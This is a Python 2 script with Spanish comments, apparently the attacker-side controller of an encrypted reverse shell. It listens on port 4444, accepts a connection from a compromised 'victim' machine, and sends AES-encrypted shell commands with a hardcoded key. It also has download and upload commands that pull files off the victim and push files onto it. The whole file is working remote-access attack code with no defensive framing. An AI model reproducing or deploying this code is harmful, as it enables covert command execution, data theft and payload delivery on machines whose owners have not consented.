#!/usr/bin/python

from Crypto.Cipher import AES
import socket
import base64
import os
import time


# Se cifra con AES y se codifica con base 64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# Se genera una clave secreta aleatoria
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# Se crea un objeto AES usando la clave secreta aleatoria
cipher = AES.new(secret,AES.MODE_CFB)

# Se cifra y codifica una cadena
# encoded = EncodeAES(cipher, 'password')
# print 'Cadena cifrada:', encoded

# Se descifra y decodifica una cadena
# decoded = DecodeAES(cipher, encoded)
# print 'Cadena descifrada:', decoded

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4444))
c.listen(1)
s,a = c.accept()

downloading = False

while True:
	# recibir datos cifrados
	data = s.recv(1024)
	
	# descifrar datos
	descifrado = DecodeAES(cipher, data)

	# Se comprueba si es el final del comando
	if descifrado.endswith("EOF") == True:

		# se imprime el comando quitando la marca de fin
		print descifrado[:-3]
	
		if descifrado.startswith("Salir") == True:
			print 'Conexion finalizada'
			break
		# Pedir nuevo comando 
		nextcmd = raw_input("[shell]: ")
		
		# Cifrar nuevo comando introducido
		cifrado = EncodeAES(cipher, nextcmd)
		
		# Enviar nuevo comando cifrado
		s.send(cifrado)

		# descargar fichero
		if nextcmd.startswith("download") == True:

			# Se obtiene el nombre del fichero quitando download y espacio
			downFile = nextcmd[9:]

			# Se abre el fichero
			f = open(downFile, 'wb')
			print 'Descargando: ' + downFile
			
			# Bucle para la descarga
			l= s.recv(1024)
			while True:
				if l.endswith("EOF"):
					u = l[:-3]					
					f.write(u)
					break
				else:
					f.write(l)
					l = s.recv(1024)
			f.close()
		
		if nextcmd.startswith("upload") == True:

			# Se obtiene el nombre del fichero a subir a la victima quitando upload y espacio
			upFile = nextcmd[7:]
                        print "el nombre del fichero a subir es ", upFile, "\n"
			# Se abre el fichero en modo lectura y binario
			g = open(upFile, 'rb')
			print 'Subiendo: ' + upFile

			# Bucle de subida del fichero a la victima
			while 1:
				fileData = g.read()
				if not fileData: break
				# Comienza el envio del fichero
				s.sendall(fileData)
			g.close()
			time.sleep(0.8)

			# Se envia al cliente la marca de fin del fichero enviado
			s.sendall('EOF')
			time.sleep(0.8)
	else:

		print descifrado

